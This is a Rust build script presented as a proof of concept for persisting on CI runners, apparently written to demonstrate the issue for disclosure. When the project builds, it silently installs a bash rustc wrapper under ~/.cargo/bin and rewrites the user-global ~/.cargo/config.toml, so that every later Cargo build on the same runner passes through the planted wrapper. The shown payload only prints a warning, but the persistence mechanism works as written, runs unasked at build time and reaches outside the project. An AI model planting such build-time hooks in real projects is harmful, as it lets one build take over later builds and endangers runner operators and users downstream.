// Safe, reversible runner-persistence PoC (prints in base logs on same runner).
// It installs ~/.cargo/bin/rustc-wrapper and points Cargo to it via ~/.cargo/config.toml.
// The wrapper prints a WARNING then execs the real compiler. No secrets, no network.

use std::{env, fs, io, path::PathBuf};

#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

fn make_exec(p: &PathBuf) -> io::Result<()> {
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(p)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(p, perms)?;
    }
    Ok(())
}

fn main() {
    let home = env::var("HOME").unwrap_or_default();
    let cargo_dir = PathBuf::from(format!("{home}/.cargo"));
    let bin_dir = cargo_dir.join("bin");
    let wrapper = bin_dir.join("rustc-wrapper");
    let config = cargo_dir.join("config.toml");

    let _ = fs::create_dir_all(&bin_dir);

    // The rustc wrapper contract: Cargo sets $RUSTC to the real compiler; call it with same args.
    let wrapper_body = r#"#!/usr/bin/env bash
# SAFE_RUNNER_PERSIST_POC rustc-wrapper
echo "WARNING: ===RUNNER_PERSIST_POC HIT=== rustc $* (safe: no secrets, no network)" 1>&2
exec "${RUSTC:-rustc}" "$@"
"#;

    // Install wrapper
    if fs::write(&wrapper, wrapper_body.as_bytes()).is_ok() {
        let _ = make_exec(&wrapper);
        println!("cargo:warning=PoC: installed ~/.cargo/bin/rustc-wrapper");
    } else {
        println!("cargo:warning=PoC: failed to write rustc-wrapper");
    }

    // Point Cargo to the wrapper (idempotent, minimal)
    // Keep any existing config by appending/merging if needed.
    let line = format!(r#"rustc-wrapper = "{}""#, wrapper.display());
    let mut cfg = String::new();
    if let Ok(existing) = fs::read_to_string(&config) {
        cfg = existing;
        if !cfg.contains("rustc-wrapper") {
            // Insert under [build] or add a new one.
            if cfg.contains("[build]") {
                cfg = cfg.replace("[build]", &format!("[build]\n{line}\n"));
            } else {
                cfg.push_str("\n[build]\n");
                cfg.push_str(&line);
                cfg.push('\n');
            }
        }
    } else {
        cfg = format!("[build]\n{line}\n");
    }
    let _ = fs::write(&config, cfg);
    println!("cargo:warning=PoC: set build.rustc-wrapper in ~/.cargo/config.toml");
}
